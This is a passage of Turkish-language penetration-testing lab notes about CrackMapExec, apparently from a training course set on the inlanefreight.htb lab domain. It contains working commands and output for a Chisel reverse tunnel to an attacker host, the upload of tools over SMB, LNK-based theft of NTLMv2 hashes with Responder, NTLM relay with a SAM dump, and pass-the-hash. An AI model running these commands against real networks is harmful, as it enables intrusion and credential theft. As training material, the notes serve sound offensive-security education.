*  Chisel'Ä± SaldÄ±rÄ± Hostumuza indirin ve Ã‡alÄ±ÅŸtÄ±rÄ±n:

### Chisel - Reverse Tunnel

```
wget
https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_l
inux_amd64.gz -O chisel.gz -q

gunzip -d chisel.gz

chmod +x chisel

./chisel server --reverse

2022/11/06 10:57:00 server: Reverse tunnelling enabled
2022/11/06 10:57:00 server: Fingerprint
CelKxt2EsL1SUFnvo634FucIOPqlFKQJi8t/aTjRfWo=
2022/11/06 10:57:00 server: Listening on http://0.0.0.0:8080
```


*  Chisel for Windows'u Ä°ndirin ve Hedef Host'a YÃ¼kleyin:


### Upload Chisel

```
wget
https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_w
indows_amd64.gz -O chisel.exe.gz -q

gunzip -d chisel.exe.gz

crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! --put-file
./chisel.exe \\Windows\\Temp\\chisel.exe

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [*] Copy ./chisel.exe
to \Windows\Temp\chisel.exe
SMB 10.129.204.133 445 MS01 [+] Created file
./chisel.exe on \\C$\\Windows\Temp\chisel.exe

```


* CrackMapExec komut yÃ¼rÃ¼tme seÃ§eneÄŸi `-x`'i kullanarak Chisel sunucumuza baÄŸlanmak iÃ§in `chisel.exe` dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n (Bu seÃ§eneÄŸi Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha fazla tartÄ±ÅŸacaÄŸÄ±z)


### Connect to the Chisel Server

```
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x "C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks"

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
```

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar Ã§alÄ±ÅŸmaya devam edecektir. Bunu bu bÃ¶lÃ¼mde daha sonra yapacaÄŸÄ±z.

**Attack host** Ã¼zerinde, **Chisel server** Ã§Ä±ktÄ±sÄ±nda **bir client baÄŸlantÄ±sÄ± aldÄ±ÄŸÄ±mÄ±zÄ± ve tÃ¼neli baÅŸlattÄ±ÄŸÄ±mÄ±zÄ±** gÃ¶steren yeni bir satÄ±r gÃ¶rmeliyiz.

### Chisel Receiving Session No. 1

```
./chisel server --reverse
<SNIP>
2022/11/06 10:57:54 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks:
Listening

```

TCP 1080 portunun dinlenip dinlenmediÄŸini kontrol ederek de tÃ¼nelin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulayabiliriz:


### Check Listening Port

```
netstat -lnpt | grep 1080
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
tcp 0 0 127.0.0.1:1080 0.0.0.0:* LISTEN
446306/./chisel
```

* Proxyychains'i Chisel varsayÄ±lan portu `TCP 1080`'i kullanacak ÅŸekilde yapÄ±landÄ±rmamÄ±z gerekir. YapÄ±landÄ±rma dosyasÄ±nÄ±n ProxyList bÃ¶lÃ¼mÃ¼ne `socks5 127.0.0.1 1080`'i aÅŸaÄŸÄ±daki gibi eklediÄŸimizden emin olmamÄ±z gerekiyor:


### Configure Proxychains

```
cat /etc/proxychains.conf
<SNIP>
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080
```

* ArtÄ±k 172.16.1.10 IP'sine ulaÅŸmak iÃ§in `Proxychains` aracÄ±lÄ±ÄŸÄ±yla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

```
proxychains crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:445 ...
OK
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:445 ...
OK
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:135 ...
OK
SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:445 ...
OK
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:445 ...
OK
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 172.16.1.10 445 DC01 [+] Enumerated shares
SMB 172.16.1.10 445 DC01 Share
Permissions Remark
SMB 172.16.1.10 445 DC01 ----- ------
----- ------
SMB 172.16.1.10 445 DC01 ADMIN$ READ
Remote Admin
SMB 172.16.1.10 445 DC01 C$
READ,WRITE Default share
SMB 172.16.1.10 445 DC01 carlos
SMB 172.16.1.10 445 DC01 D$
READ,WRITE Default share
SMB 172.16.1.10 445 DC01 david
SMB 172.16.1.10 445 DC01 IPC$ READ
Remote IPC
SMB 172.16.1.10 445 DC01 IT
READ,WRITE
SMB 172.16.1.10 445 DC01 john
SMB 172.16.1.10 445 DC01 julio
SMB 172.16.1.10 445 DC01 linux01
READ,WRITE
SMB 172.16.1.10 445 DC01 NETLOGON READ
Logon server share
SMB 172.16.1.10 445 DC01 svc_workstations
SMB 172.16.1.10 445 DC01 SYSVOL READ
Logon server share
```


Proxychains Ã§Ä±ktÄ±sÄ±nÄ± konsoldan kaldÄ±rmak iÃ§in `Proxychains4` ve `quiet -q` seÃ§eneÄŸini kullanabiliriz:

### Quiet SeÃ§eneÄŸi ile Proxychains4

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01!
--shares

SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 172.16.1.10 445 DC01 [+] Enumerated shares
SMB 172.16.1.10 445 DC01 Share
Permissions Remark
SMB 172.16.1.10 445 DC01 ----- ------
----- ------
SMB 172.16.1.10 445 DC01 ADMIN$ READ
Remote Admin
SMB 172.16.1.10 445 DC01 C$
READ,WRITE Default share
SMB 172.16.1.10 445 DC01 carlos
SMB 172.16.1.10 445 DC01 D$
READ,WRITE Default share
SMB 172.16.1.10 445 DC01 david
SMB 172.16.1.10 445 DC01 IPC$ READ
Remote IPC
SMB 172.16.1.10 445 DC01 IT
READ,WRITE
SMB 172.16.1.10 445 DC01 john
SMB 172.16.1.10 445 DC01 julio
SMB 172.16.1.10 445 DC01 linux01
READ,WRITE
SMB 172.16.1.10 445 DC01 NETLOGON READ
Logon server share
SMB 172.16.1.10 445 DC01 svc_workstations
SMB 172.16.1.10 445 DC01 SYSVOL READ
Logon server share
```

Proxychains aracÄ±lÄ±ÄŸÄ±yla herhangi bir CME iÅŸlemi gerÃ§ekleÅŸtirebiliriz.


### Killing Chisel on the Target Machine

Ä°ÅŸimiz bittiÄŸinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak iÃ§in, PowerShell komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in `-X` seÃ§eneÄŸini kullanacaÄŸÄ±z ve PowerShell komutunu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z `Stop-Process - Name chisel -Force .` Komut yÃ¼rÃ¼tme konusunu Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z.


### Kill the Chisel Client

```
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -X "StopProcess -Name chisel -Force"

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
```

Bunu yaptÄ±ktan sonra, Chisel client komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±z terminal aÅŸaÄŸÄ±daki gibi sonuÃ§lanmalÄ±dÄ±r:


### Chisel'i Zorla Durdurduktan Sonra Terminalin KapanmasÄ±

```
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x
"C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks"

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
SMB 10.129.204.133 445 MS01 2022/11/07 06:26:10
client: Connecting to ws://10.10.14.33:8080
SMB 10.129.204.133 445 MS01 2022/11/07 06:26:11
client: Connected (Latency 125.6629ms)
```

ArtÄ±k saldÄ±rÄ± konaÄŸÄ±mÄ±zdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Ãœzerinde Chisel'i Kapatma

```
./chisel server --reverse
2022/12/08 16:43:17 server: Reverse tunnelling enabled
2022/12/08 16:43:17 server: Fingerprint
NVnBjtu2DPIuQPxLU0YdcyZhRKc+Myi3ojPzo0T2frQ=
2022/12/08 16:43:17 server: Listening on http://0.0.0.0:8080
2022/12/08 16:44:21 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks:
Listening
^C

```


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak baÅŸlatarak ve saldÄ±rÄ± hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak baÅŸlatmak iÃ§in `server --socks5` seÃ§eneÄŸini kullanacaÄŸÄ±z.


### Chisel'i Hedef Makinede Sunucu Olarak BaÅŸlatma

```
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x
"C:\Windows\Temp\chisel.exe server --socks5"

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
```

Åimdi hedef makinemiz Chisel sunucusuna baÄŸlanmak ve proxy'yi etkinleÅŸtirmek iÃ§in IP ve porttan sonra `socks` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna BaÄŸlanma

```
sudo chisel client 10.129.204.133:8080 socks
2022/11/22 06:56:01 client: Connecting to ws://10.129.204.133:8080
2022/11/22 06:56:01 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/11/22 06:56:02 client: Connected (Latency 124.871246ms)
```

Åimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e BaÄŸlanmak iÃ§in Proxy Chain'i Kullanma

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares

SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 172.16.1.10 445 DC01 [+] Enumerated shares
SMB 172.16.1.10 445 DC01 Share
Permissions Remark
SMB 172.16.1.10 445 DC01 ----- ------
----- ------
SMB 172.16.1.10 445 DC01 ADMIN$ READ
Remote Admin
<SNIP>

```

Bu bÃ¶lÃ¼mde, **attack host** Ã¼zerinde **Proxychains** ve **Chisel** yapÄ±landÄ±rmayÄ± ve **CrackMapExec** kullanarak hedef makinede **Chisel** Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrendik.

Ä°lerleyen bÃ¶lÃ¼mlerde, diÄŸer aÄŸlara ulaÅŸmak iÃ§in `CrackMapExec` ve `Proxychains` kullanacaÄŸÄ±z.

---

### Stealing Hashes

Yeni hesaplarÄ± ele geÃ§irmek iÃ§in kullanÄ±lan en yaygÄ±n tekniklerden biri parola hashlerinin Ã§alÄ±nmasÄ±dÄ±r. Bunu baÅŸarmanÄ±n farklÄ± yÃ¶ntemleri vardÄ±r, ancak yaygÄ±n olanÄ±, bir bilgisayarÄ± veya kullanÄ±cÄ±yÄ± kontrol ettiÄŸimiz sahte bir paylaÅŸÄ±lan klasÃ¶rle bir kimlik doÄŸrulama iÅŸlemi baÅŸlatmaya zorlamaktÄ±r.

Bu kimlik doÄŸrulama iÅŸlemini baÅŸlatÄ±rken, kullanÄ±cÄ± veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araÃ§ kullanÄ±larak kÄ±rÄ±labilir veya kimlik bilgilerini bilmeden kullanÄ±cÄ±nÄ±n kimliÄŸine bÃ¼rÃ¼nmek iÃ§in baÅŸka bir bilgisayara iletilebilir.

PaylaÅŸÄ±lan klasÃ¶rleri kullanarak hash'leri Ã§almak iÃ§in bir kÄ±sayol oluÅŸturabilir ve kÄ±sayolda gÃ¶rÃ¼nen simge sahte paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼zÃ¼ gÃ¶sterecek ÅŸekilde yapÄ±landÄ±rabiliriz. KullanÄ±cÄ± paylaÅŸÄ±lan klasÃ¶re girdiÄŸinde, simgenin konumunu aramaya Ã§alÄ±ÅŸacak ve paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼ze karÅŸÄ± kimlik doÄŸrulamasÄ±nÄ± zorlayacaktÄ±r.

NTLMv2 hash'lerini toplama hakkÄ±nda daha fazla bilgi edinmek iÃ§in RedTeam Ekipler iÃ§in [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadÄ±](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kÄ±sayollarÄ±n kullanÄ±mÄ±nÄ± deÄŸil, aynÄ± amaca hizmet eden diÄŸer dosya tÃ¼rlerini de gÃ¶sterir.


### Slinky ModÃ¼lÃ¼

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafÄ±ndan oluÅŸturulan bir modÃ¼ldÃ¼r ve CME'deki en heyecan verici modÃ¼llerden biridir. Prensip basittir. ModÃ¼l, yazma izinlerine sahip tÃ¼m paylaÅŸÄ±mlarda belirtilen SMB sunucusuna bir UNC yolu iÃ§eren simge attribute'a sahip Windows kÄ±sayollarÄ± oluÅŸturur. Birisi paylaÅŸÄ±mÄ± ziyaret ettiÄŸinde, simge attribute'u sunucumuza giden bir UNC yolu iÃ§erdiÄŸi iÃ§in `Responder` kullanarak NTLMv2 hash'ini alacaÄŸÄ±z.

ModÃ¼lÃ¼n `SERVER` ve `NAME` olmak Ã¼zere iki zorunlu seÃ§eneÄŸi ve bir isteÄŸe baÄŸlÄ± `CLEANUP` seÃ§eneÄŸi vardÄ±r.


### Slinky Module Options

```
crackmapexec smb -M slinky --options
[*] slinky module options:
 SERVER IP of the SMB server
 NAME LNK file nametest
 CLEANUP Cleanup (choices: True or False)

```

`SERVER`, kontrol ettiÄŸimiz SMB sunucusunun IP'sine ve UNC yolunun iÅŸaret etmesini istediÄŸimiz yere karÅŸÄ±lÄ±k gelir. `NAME` seÃ§eneÄŸi kÄ±sayol dosyasÄ±na bir isim atar, `CLEANUP` ise iÅŸimiz bittiÄŸinde kÄ±sayolu silmek iÃ§indir.


### Chisel kullanarak baÄŸlama

Bu alÄ±ÅŸtÄ±rma iÃ§in lokal eriÅŸimi simÃ¼le edeceÄŸiz ve internal aÄŸa baÄŸlanmak iÃ§in Chisel ve Proxychains kullanacaÄŸÄ±z. Chisel zaten hedef makinemizde bir sunucu olarak Ã§alÄ±ÅŸÄ±yor ve bir client olarak baÄŸlanmamÄ±z ve daha sonra internal aÄŸÄ± numaralandÄ±rmak iÃ§in proxychains kullanmamÄ±z gerekiyor. Chisel kullanarak baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu **kullanalÄ±m**


### Hedef Makine Chisel Sunucusuna BaÄŸlanma

```
sudo chisel client 10.129.204.133:8080 socks
2022/11/22 07:15:52 client: Connecting to ws://10.129.204.133:8080
2022/11/22 07:15:52 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/11/22 07:15:53 client: Connected (Latency 125.541725ms)

```


### NTLMv2 Hash'lerinin Ã‡alÄ±nmasÄ±
Ä°lk olarak, `--shares` seÃ§eneÄŸini kullanarak `grace` kullanÄ±cÄ±sÄ±nÄ±n `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸu bir paylaÅŸÄ±m bulalÄ±m:

### WRITE AyrÄ±calÄ±klarÄ±na Sahip PaylaÅŸÄ±mlarÄ± Bulma

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares

SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 172.16.1.10 445 DC01 [+] Enumerated shares
SMB 172.16.1.10 445 DC01 Share
Permissions Remark
SMB 172.16.1.10 445 DC01 ----- ------
----- ------
SMB 172.16.1.10 445 DC01 ADMIN$
Remote Admin
SMB 172.16.1.10 445 DC01 C$
Default share
SMB 172.16.1.10 445 DC01 D$
Default share
SMB 172.16.1.10 445 DC01 flag READ
SMB 172.16.1.10 445 DC01 HR
READ,WRITE
SMB 172.16.1.10 445 DC01 IPC$ READ
Remote IPC
SMB 172.16.1.10 445 DC01 IT
SMB 172.16.1.10 445 DC01 IT-Tools
READ,WRITE
SMB 172.16.1.10 445 DC01 NETLOGON READ
Logon server share
SMB 172.16.1.10 445 DC01 SYSVOL READ
Logon server share

```


GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `grace` `HR` ve `IT-Tools` paylaÅŸÄ±mlarÄ±na yazabilir. Bu nedenle her bir paylaÅŸÄ±ma bir `LNK` dosyasÄ± yazmak iÃ§in `Slinky` modÃ¼lÃ¼nÃ¼ kullanabiliriz. 

**SERVER=10.10.14.33** seÃ§eneÄŸini kullanarak **attack host**'umuzun **tun0** aÄŸÄ±ndaki **IP adresini** belirteceÄŸiz ve **NAME=important** seÃ§eneÄŸiyle **LNK dosyasÄ±na atanacak dosya adÄ±nÄ±** belirleyeceÄŸiz.


### Using Slinky

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01!
-M slinky -o SERVER=10.10.14.33 NAME=important

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SLINKY 172.16.1.10 445 DC01 [+] Found writable
share: HR
SLINKY 172.16.1.10 445 DC01 [+] Created LNK file
on the HR share
SLINKY 172.16.1.10 445 DC01 [+] Found writable
share: IT-Tools
SLINKY 172.16.1.10 445 DC01 [+] Created LNK file
on the IT-Tools share
```


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` aÃ§Ä±sÄ±ndan gÃ¼venli** olarak kabul edilir Ã§Ã¼nkÃ¼ tÃ¼m iÅŸlemler ya **`bellekte` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ya **`WinAPI` Ã§aÄŸrÄ±larÄ±yla aÄŸ Ã¼zerinden sorgulanÄ±r**, ya da **Windows'un built-in araÃ§larÄ±/Ã¶zellikleri** kullanÄ±larak gerÃ§ekleÅŸtirilir.

Bu gereksinimleri karÅŸÄ±lamayan bir modÃ¼l Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda, **Ã¶nceden bir uyarÄ± alÄ±rÄ±z**. **`Slinky`** modÃ¼lÃ¼, **OpSec aÃ§Ä±sÄ±ndan gÃ¼venli olmayan** bir modÃ¼le Ã¶rnektir. Devam etmeden Ã¶nce **bir uyarÄ± alacaÄŸÄ±z**.

LNK dosyasÄ± oluÅŸturulduktan sonra, Responder'Ä± Ã§alÄ±ÅŸtÄ±rmamÄ±z ve birinin paylaÅŸÄ±ma gÃ¶z atmasÄ±nÄ± beklememiz gerekir. 


### Starting Responder

```
sudo responder -I tun0
 __
 .----.-----.-----.-----.-----.-----.--| |.-----.----.
 | _| -__|__ --| _ | _ | | _ || -__| _|
 |__| |_____|_____| __|_____|__|__|_____||_____|__|
 |__|
 NBT-NS, LLMNR & MDNS Responder 3.0.6.0
 Author: Laurent Gaffie ([email protected])
 To kill this script, hit CTRL-C
<SNIP>
[+] Listening for events...
[SMB] NTLMv2-SSP Client : 10.129.204.133
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\julio
[SMB] NTLMv2-SSP Hash :
julio::INLANEFREIGHT:6ab02caa0926e456:433DB600379844344ED4D3A073CAF995:010
1000000000000004A2BBF8808D901D4CC1FFAB74CC23F00000000020008004400320058005
60001001E00570049004E002D0030005500510058004E00570046004100550030004400040
03400570049004E002D0030005500510058004E005700460041005500300044002E0044003
200580056002E004C004F00430041004C0003001400440<SNIP>
```

Not: Hash'i yakalamak iÃ§in `Responder.conf` dosyasÄ±nda SMB seÃ§eneÄŸi `On` olmalÄ±dÄ±r.

NTLMv2 hash'imizi aldÄ±k ve hesabÄ± kullanmak iÃ§in onu kÄ±rmamÄ±z gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kÄ±rmak iÃ§in, `ASREPRoast` ve `Kerberoasting` ile yaptÄ±ÄŸÄ±mÄ±z gibi `Hashcat mod 5600`'Ã¼ kullanabiliriz. `NTLM Relay`'e odaklanalÄ±m.


### **NTLM Relay**

DiÄŸer bir Ã§Ã¶zÃ¼m ise NTLMv2 hash'ini doÄŸrudan `SMB Sign`'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± aÄŸdaki diÄŸer sunuculara ve workstation'lara iletmektir. SMB Sign Ã§ok Ã¶nemlidir Ã§Ã¼nkÃ¼ bir bilgisayarda SMB Sign etkinse, saldÄ±rÄ± hostumuzun kimliÄŸini kanÄ±tlayamayacaÄŸÄ±mÄ±z iÃ§in o bilgisayara relay yapamayÄ±z. SMB Sign'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± hedeflerin bir listesini almak iÃ§in `--gen-relay-list` seÃ§eneÄŸini kullanabiliriz.

Åimdi Proxychains'i kullanabilir ve SMB Sign devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ makinelerin bir listesini alabiliriz

### Getting Relay List

```
proxychains4 -q crackmapexec smb 172.16.1.0/24 --gen-relay-list relay.txt

SMB 172.16.1.5 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)

cat relay.txt
172.16.1.5
```


**`ntlmrelayx`** aracÄ±nÄ±, daha Ã¶nce **`--gen-relay-list`** seÃ§eneÄŸiyle elde ettiÄŸimiz listeyle birlikte kullanacaÄŸÄ±z.

Hedef makinede **local administrator** ayrÄ±calÄ±klarÄ±na sahip bir hesap bulursak ve ek seÃ§enekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanÄ±cÄ±sÄ±nÄ±n hash'leriyle** bir **`pass-the-hash attack`** gerÃ§ekleÅŸtirmeyi deneyebiliriz.

### Execute NTLMRelayX

```
sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth
Corporation
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

Bir kullanÄ±cÄ±nÄ±n **SMB share**'ine eriÅŸmesini beklemeliyiz. **LNK dosyamÄ±z**, kullanÄ±cÄ±nÄ±n hedef makinemize baÄŸlanmasÄ±nÄ± zorlar (**bu iÅŸlem arka planda gerÃ§ekleÅŸir ve kullanÄ±cÄ± herhangi bir anormallik fark etmez**).

Bu gerÃ§ekleÅŸtiÄŸinde, **`ntlmrelayx`** konsolunda aÅŸaÄŸÄ±dakine benzer bir Ã§Ä±ktÄ± gÃ¶rmeliyiz:

```
sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth
Corporation
<SNIP>
[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/[email protected]
controlled, attacking target smb://172.16.1.5
[*] Authenticating against smb://172.16.1.5 as INLANEFREIGHT/JULIO SUCCEED
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/[email protected]
controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x29fc3535fc09fb37d22dc9f3339f6875
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0
660cf3453:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077a
ee1958e7f78070:::
localadmin:1003:aad3b435b51404eeaad3b435b51404ee:7c08d63a2f48f045971bc2236
ed3f3ac:::
sshd:1004:aad3b435b51404eeaad3b435b51404ee:d24156d278dfefe29553408e826a95f
6:::
htb:1006:aad3b435b51404eeaad3b435b51404ee:6593d8c034bbe9db50e4ce94b1943701
:::
[*] Done dumping SAM hashes for host: 172.16.1.5
[*] Stopping service RemoteRegistry
```

ArdÄ±ndan, administrator hash'ini kullanarak hedef makinede kimlik doÄŸrulamasÄ± yapmak iÃ§in crackmapexec'i kullanabiliriz:

### Local HesaplarÄ± Test Etme

```
proxychains4 -q crackmapexec smb 172.16.1.5 -u administrator -H
30b3783ce2abf1af70f77d0660cf3453 --local-auth

SMB 172.16.1.5 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB 172.16.1.5 445 MS01 [+]
MS01\administrator:30b3783ce2abf1af70f77d0660cf3453 (Pwn3d!)
```

### Her Åeyi Temizleyin

ModÃ¼lÃ¼ kullandÄ±ktan sonra, **LNK dosyasÄ±nÄ± temizlemek** iÃ§in **`-o CLEANUP=YES`** seÃ§eneÄŸini ve **LNK dosyasÄ±nÄ±n adÄ±nÄ±** (**`NAME=important`**) belirtmek kritik Ã¶nem taÅŸÄ±r.

### Cleanup

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01!
-M slinky -o NAME=important CLEANUP=YES

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SLINKY 172.16.1.10 445 DC01 [+] Found writable
share: HR
SLINKY 172.16.1.10 445 DC01 [+] Deleted LNK file
on the HR share
SLINKY 172.16.1.10 445 DC01 [+] Found writable
share: IT-Tools
SLINKY 172.16.1.10 445 DC01 [+] Deleted LNK file
on the IT-Tools share
```

### drop-sc ModÃ¼lÃ¼ ile Hash'lerin Ã‡alÄ±nmasÄ±

